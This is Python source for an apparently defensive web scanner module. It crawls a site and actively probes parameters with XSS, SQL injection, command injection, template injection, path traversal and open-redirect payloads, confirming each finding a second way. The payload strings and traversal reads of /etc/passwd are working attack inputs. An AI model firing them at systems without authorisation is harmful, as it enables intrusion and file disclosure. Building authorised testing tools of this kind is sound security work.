"""Web — active injection testing with two-step confirmation.

Crawls the target, collects injectable parameters (query strings + HTML forms)
and probes each with a battery of techniques. Every technique has a single,
explainable oracle, and every hit is *confirmed a second way* before it's
reported — so a finding is evidence, not a guess:

  * Reflected XSS         a marker with raw <, >, " reflects unencoded.
  * SQLi (error-based)    a single quote raises a DB error; a balanced quote
                          clears it — proving the quote was the cause.
  * SQLi (boolean blind)  a TRUE condition returns the normal page while a
                          FALSE one diverges, across two injection contexts.
  * SQLi (time blind)     a SLEEP/pg_sleep/WAITFOR payload delays the response;
                          confirmed by a *second*, longer sleep — the measured
                          delay must track the time we asked for.
  * Command injection     a `; sleep N` payload delays the response (same time-
                          correlation proof) — server-side command execution.
  * SSTI                  {{a*b}} comes back evaluated (the product, not the
                          expression), confirmed with a second random product.
  * Path traversal / LFI  ../../etc/passwd returns a `root:x:0:0:` signature
                          absent from the baseline.
  * Open redirect         a redirect-style param lands in the Location header.

Run with -v/--verbose to watch each payload, its oracle measurement and the
confirmation step live.
"""

from __future__ import annotations

import asyncio
import random
import re
import string
import time
from urllib.parse import urlencode, urlsplit

from wraith.core import web
from wraith.core.http import fetch
from wraith.core.models import Severity
from wraith.core.phase import Phase, register

# --------------------------------------------------------------- signatures
_SQL_ERRORS = re.compile(
    r"(you have an error in your sql syntax|warning: mysqli?_|mysql_fetch|"
    r"valid mysql result|ORA-\d{5}|quoted string not properly terminated|"
    r"PostgreSQL.*ERROR|pg_query\(\)|syntax error at or near|SQLite3?::|"
    r"sqlite3.OperationalError|Microsoft OLE DB Provider|"
    r"Unclosed quotation mark|SQLSTATE\[)",
    re.I,
)
_PASSWD = re.compile(r"root:.*?:0:0:")                       # /etc/passwd first line
_WININI = re.compile(r"\[(?:fonts|extensions|mci|files)\]", re.I)  # windows win.ini sections

REDIRECT_PARAMS = {
    "url", "next", "redirect", "redirect_url", "redirecturl", "return", "returnurl",
    "return_url", "dest", "destination", "continue", "r", "u", "go", "to", "target",
    "link", "out", "view", "image_url",
}

# --------------------------------------------------------------- payloads
# Time-based. {s} = seconds to sleep; the leading 1'/1 closes a likely string
# or numeric context before the injected delay.
_SQLI_TIME = [
    ("sqli/MySQL",      "1' AND SLEEP({s})-- -"),
    ("sqli/MySQL-num",  "1 AND SLEEP({s})-- -"),
    ("sqli/PostgreSQL", "1';SELECT pg_sleep({s})-- -"),
    ("sqli/MSSQL",      "1';WAITFOR DELAY '0:0:{s}'-- -"),
]
_CMDI_TIME = [
    ("cmdi/shell-;",   "1; sleep {s} "),
    ("cmdi/shell-|",   "1| sleep {s} "),
    ("cmdi/subshell",  "1$(sleep {s})"),
    ("cmdi/backtick",  "1`sleep {s}`"),
]
# Boolean-blind: (TRUE, FALSE) pairs in three quoting contexts.
_SQLI_BOOL = [
    ("1' AND '1'='1", "1' AND '1'='2"),
    ("1 AND 1=1",     "1 AND 1=2"),
    ('1" AND "1"="1', '1" AND "1"="2'),
]
# Path traversal / LFI: (payload, label). All checked against the signatures.
_LFI_PAYLOADS = [
    ("../../../../../../../../etc/passwd",          "unix /etc/passwd"),
    ("....//....//....//....//....//etc/passwd",     "unix (dot-dot filter bypass)"),
    ("..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",  "unix (url-encoded)"),
    ("..\\..\\..\\..\\..\\..\\windows\\win.ini",     "windows win.ini"),
]


# ------------------------------------------------------- oracles (pure, tested)
def looks_like_sql_error(text: str) -> bool:
    return bool(_SQL_ERRORS.search(text or ""))


def lfi_signature(text: str) -> str | None:
    """Name of the system file leaked in the response, or None."""
    if _PASSWD.search(text or ""):
        return "/etc/passwd"
    if _WININI.search(text or ""):
        return "windows/win.ini"
    return None


def ssti_payloads(a: int, b: int) -> list[tuple[str, str]]:
    """Render `a*b` in several template syntaxes. The engine that evaluates it
    returns the product; an engine that merely reflects echoes the expression."""
    e = f"{a}*{b}"
    return [
        ("Jinja2/Twig",      "{{%s}}" % e),
        ("Smarty/FreeMarker", "${%s}" % e),
        ("ERB",              "<%%= %s %%>" % e),
        ("Razor/Thymeleaf",  "#{%s}" % e),
    ]


def ssti_evaluated(text: str, product: int, expr: str) -> bool:
    """The product is present and the raw expression is gone -> it was evaluated."""
    text = text or ""
    return str(product) in text and expr not in text


def boolean_blind_hit(sim_true: float, sim_false: float) -> bool:
    """TRUE keeps the page (~ the normal one); FALSE breaks clearly away."""
    return sim_true >= 0.95 and sim_false <= 0.90


def timing_hit(base_t: float, elapsed: float, slept: float, frac: float = 0.6) -> bool:
    """The response took at least a good fraction of the sleep longer than normal."""
    return elapsed - base_t >= slept * frac


def timing_confirms(base_t: float, e1: float, s1: float, e2: float, s2: float) -> bool:
    """Both probes delayed AND the longer sleep delayed proportionally more —
    the response time tracks the injected sleep, ruling out random network lag."""
    return (timing_hit(base_t, e1, s1) and timing_hit(base_t, e2, s2)
            and (e2 - base_t) > (e1 - base_t) + 0.5 * (s2 - s1))


@register
class InjectionPhase(Phase):
    name = "injection"
    requires = frozenset({"http-probe"})
    description = "XSS, SQLi (error/boolean/time), command injection, SSTI, LFI, open redirect."

    MAX_PAGES = 25
    MAX_POINTS = 60
    TIMING_POINTS = 10      # time-based probes are slow; cap how many points get them
    SLEEP_FAST = 3          # initial time-based probe
    SLEEP_CONFIRM = 6       # confirmation sleep — must delay proportionally more

    async def run(self, ws, console) -> None:
        for base in self._bases(ws):
            host = urlsplit(base).netloc
            seeds = [base + "/"] + [e.url for e in ws.endpoints if e.url.startswith(base)]
            pages = await web.crawl(seeds, host, fetch, self.MAX_PAGES)

            points, seen = [], set()
            for url, resp in pages.items():
                for pt in web.build_points(url, resp.text):
                    key = (pt.method, pt.action, pt.param, pt.location)
                    if key not in seen:
                        seen.add(key)
                        points.append(pt)
            points = points[: self.MAX_POINTS]
            if not points:
                console.warn(f"{base}: no injectable parameters found")
                continue

            console.info(f"{base}: testing {len(points)} parameter(s)")
            for i, pt in enumerate(points):
                console.trace(f"[{i + 1}/{len(points)}] {pt.method} {pt.action} [{pt.param}] ({pt.location})")
                sqli = await self._test_sqli_error(ws, console, pt)
                sqli |= await self._test_sqli_boolean(ws, console, pt)
                await self._test_ssti(ws, console, pt)
                await self._test_lfi(ws, console, pt)
                await self._test_xss(ws, console, pt)
                if pt.param.lower() in REDIRECT_PARAMS and pt.location == "query":
                    await self._test_open_redirect(ws, console, pt)
                # Time-based is expensive: bounded subset, and skip the SQL family
                # if the param already proved SQL-injectable (still probe cmdi).
                if i < self.TIMING_POINTS:
                    await self._test_time_based(ws, console, pt, skip_sql=sqli)

    # ----------------------------------------------------------- transport
    async def _send(self, pt, value, timeout=8.0):
        values = dict(pt.values)
        values[pt.param] = value
        if pt.location == "query":
            return await fetch(f"{pt.action}?{urlencode(values)}", method="GET",
                               allow_redirects=False, timeout=timeout)
        return await fetch(pt.action, method="POST", data=values,
                           allow_redirects=False, timeout=timeout)

    async def _timed_send(self, pt, value, timeout):
        t0 = time.monotonic()
        r = await self._send(pt, value, timeout=timeout)
        return r, time.monotonic() - t0

    # ------------------------------------------------------------------ XSS
    async def _test_xss(self, ws, console, pt) -> bool:
        probe = "wx" + "".join(random.choice(string.ascii_lowercase) for _ in range(6))
        payload = f'{probe}"><svg/onload=alert(1)>'
        r = await self._send(pt, payload)
        hit = bool(r and payload in r.text)
        console.trace(f"xss        marker reflected raw={hit}")
        if hit:
            self._report(ws, console, "Reflected XSS", Severity.HIGH, pt, payload,
                         "Input is reflected without output encoding, allowing script injection.")
        return hit

    # ------------------------------------------------------ SQLi error-based
    async def _test_sqli_error(self, ws, console, pt) -> bool:
        baseline = await self._send(pt, "1")
        injected = await self._send(pt, "1'")
        base_err = bool(baseline and looks_like_sql_error(baseline.text))
        inj_err = bool(injected and looks_like_sql_error(injected.text))
        console.trace(f"sqli/error baseline_err={base_err} injected_err={inj_err}")
        if inj_err and not base_err:
            # Confirm: a *balanced* quote should not error — proving the quote was
            # what broke the query (not some unrelated 500 on any odd input).
            balanced = await self._send(pt, "1''")
            cleared = not (balanced and looks_like_sql_error(balanced.text))
            console.trace(f"confirm sqli/error balanced-quote clears={cleared}")
            if cleared:
                self._report(ws, console, "SQL Injection (error-based)", Severity.HIGH, pt, "1'",
                             "A single quote raised a database error that a balanced quote clears — "
                             "the query is built from unsanitised input.")
                return True
        return False

    # ----------------------------------------------------- SQLi boolean-blind
    async def _test_sqli_boolean(self, ws, console, pt) -> bool:
        benign = await self._send(pt, pt.values.get(pt.param) or "1")
        if benign is None or not (200 <= benign.status < 300):
            return False
        true_v, false_v = _SQLI_BOOL[0]
        rt = await self._send(pt, true_v)
        rf = await self._send(pt, false_v)
        if not (rt and rf):
            return False
        sim_t = self._similar(rt.text, benign.text)
        sim_f = self._similar(rf.text, benign.text)
        console.trace(f"sqli/bool  true~normal={sim_t:.2f} false~normal={sim_f:.2f}")
        if not boolean_blind_hit(sim_t, sim_f):
            return False
        # Confirm in a different quoting context — a template that just happens to
        # vary won't react the same way to two unrelated boolean injections.
        for t2, f2 in _SQLI_BOOL[1:]:
            ct = await self._send(pt, t2)
            cf = await self._send(pt, f2)
            if not (ct and cf):
                continue
            if boolean_blind_hit(self._similar(ct.text, benign.text),
                                 self._similar(cf.text, benign.text)):
                console.trace("confirm sqli/bool CONFIRMED in a second context")
                self._report(ws, console, "SQL Injection (boolean blind)", Severity.HIGH, pt,
                             f"{true_v}  /  {false_v}",
                             "A TRUE condition returns the normal page while a FALSE one diverges, "
                             "confirmed across two injection contexts — the query reacts to input.")
                return True
        console.trace("confirm sqli/bool failed — discarded")
        return False

    # ------------------------------------------------------------ time-based
    async def _test_time_based(self, ws, console, pt, skip_sql=False) -> bool:
        base_t = await self._baseline_time(pt)
        console.trace(f"timing baseline {base_t:.2f}s")
        families = ([] if skip_sql else list(_SQLI_TIME)) + list(_CMDI_TIME)

        # Fire the whole family at once with a short sleep, then confirm the one
        # that bites — keeps the slow part to ~one sleep of wall-time per param.
        probes = await asyncio.gather(*[
            self._timed_send(pt, tmpl.format(s=self.SLEEP_FAST), timeout=self.SLEEP_FAST + 8)
            for _, tmpl in families
        ])
        candidate = None
        for (label, tmpl), (r, dt) in zip(families, probes):
            hit = r is not None and timing_hit(base_t, dt, self.SLEEP_FAST)
            console.trace(f"{label:<16} sleep({self.SLEEP_FAST}) → {dt:.2f}s  {'HIT' if hit else '·'}")
            if hit and candidate is None:
                candidate = (label, tmpl, dt)
        if candidate is None:
            return False

        label, tmpl, dt1 = candidate
        r2, dt2 = await self._timed_send(pt, tmpl.format(s=self.SLEEP_CONFIRM),
                                         timeout=self.SLEEP_CONFIRM + 8)
        ok = r2 is not None and timing_confirms(base_t, dt1, self.SLEEP_FAST, dt2, self.SLEEP_CONFIRM)
        console.trace(f"confirm {label} sleep({self.SLEEP_CONFIRM}) → {dt2:.2f}s  "
                      f"{'CONFIRMED' if ok else 'not correlated — discarded'}")
        if not ok:
            return False

        is_sql = label.startswith("sqli")
        kind = "SQL Injection (time-based blind)" if is_sql else "Command Injection"
        sev = Severity.HIGH if is_sql else Severity.CRITICAL
        proof = (f"baseline {base_t:.2f}s; sleep({self.SLEEP_FAST})→{dt1:.2f}s; "
                 f"sleep({self.SLEEP_CONFIRM})→{dt2:.2f}s — delay tracks the injected sleep")
        self._report(ws, console, kind, sev, pt, tmpl.format(s=self.SLEEP_FAST),
                     f"The response time scales with an injected sleep, proving server-side "
                     f"{'SQL' if is_sql else 'OS command'} execution. {proof}")
        return True

    async def _baseline_time(self, pt) -> float:
        benign = pt.values.get(pt.param) or "1"
        samples = []
        for _ in range(2):
            _, dt = await self._timed_send(pt, benign, timeout=10)
            samples.append(dt)
        return min(samples)  # min is the least noisy estimate of "normal"

    # ------------------------------------------------------------------ SSTI
    async def _test_ssti(self, ws, console, pt) -> bool:
        a, b = random.randint(41, 99), random.randint(41, 99)
        expr, product = f"{a}*{b}", a * b
        for engine, payload in ssti_payloads(a, b):
            r = await self._send(pt, payload)
            if r is None:
                continue
            hit = ssti_evaluated(r.text, product, expr)
            console.trace(f"ssti/{engine:<17} sent {expr} → {'eval=' + str(product) if hit else 'reflected/none'}")
            if not hit:
                continue
            # Confirm with a different product so a stray "{product}" in the page
            # can't pass for evaluation.
            c, d = random.randint(41, 99), random.randint(41, 99)
            r2 = await self._send(pt, payload.replace(expr, f"{c}*{d}"))
            ok = r2 is not None and ssti_evaluated(r2.text, c * d, f"{c}*{d}")
            console.trace(f"confirm ssti sent {c}*{d} → {'CONFIRMED' if ok else 'discarded'}")
            if ok:
                self._report(ws, console, "Server-Side Template Injection", Severity.HIGH, pt, payload,
                             f"A template expression was evaluated server-side ({engine}: "
                             f"sent {expr}, got {product}) — frequently a path to RCE.")
                return True
        return False

    # ------------------------------------------------------------------- LFI
    async def _test_lfi(self, ws, console, pt) -> bool:
        baseline = await self._send(pt, pt.values.get(pt.param) or "x")
        base_sig = lfi_signature(baseline.text) if baseline else None
        for payload, label in _LFI_PAYLOADS:
            r = await self._send(pt, payload)
            if r is None:
                continue
            sig = lfi_signature(r.text)
            hit = sig is not None and sig != base_sig
            console.trace(f"lfi/{label:<28} {'READ ' + sig if hit else 'no'}")
            if not hit:
                continue
            # Confirm it reads again — a one-off match could be noise.
            r2 = await self._send(pt, payload)
            if r2 and lfi_signature(r2.text) == sig:
                console.trace(f"confirm lfi {sig} read twice CONFIRMED")
                self._report(ws, console, "Path Traversal / Local File Inclusion", Severity.HIGH,
                             pt, payload,
                             f"A traversal payload returned a {sig} signature absent from the "
                             "baseline — the parameter reads arbitrary files.")
                return True
        return False

    # -------------------------------------------------------- open redirect
    async def _test_open_redirect(self, ws, console, pt) -> bool:
        r = await self._send(pt, "https://wraith.example/")
        if r is None:
            return False
        location = r.headers.get("location", "")
        hit = r.status in (301, 302, 303, 307, 308) and "wraith.example" in location
        console.trace(f"open-redirect status={r.status} location={location!r} hit={hit}")
        if hit:
            self._report(ws, console, "Open Redirect", Severity.MEDIUM, pt, "https://wraith.example/",
                         "The redirect target is taken from user input without validation.")
        return hit

    # --------------------------------------------------------------- report
    def _report(self, ws, console, title, sev, pt, payload, desc) -> None:
        where = f"{pt.method} {pt.action} [{pt.param}]"
        console.finding(sev.label, f"{title}  {where}")
        ws.add_finding(title=f"{title} in '{pt.param}'", severity=sev, phase=self.name,
                       target=pt.action, evidence=f"{where} payload={payload!r}", description=desc)

    # -------------------------------------------------------------- helpers
    @staticmethod
    def _similar(a, b) -> float:
        import difflib
        return difflib.SequenceMatcher(None, (a or "")[:4000], (b or "")[:4000]).ratio()

    @staticmethod
    def _bases(ws) -> list:
        seen, out = set(), []
        for e in ws.endpoints:
            p = urlsplit(e.url)
            base = f"{p.scheme}://{p.netloc}"
            if base not in seen:
                seen.add(base)
                out.append(base)
        return out
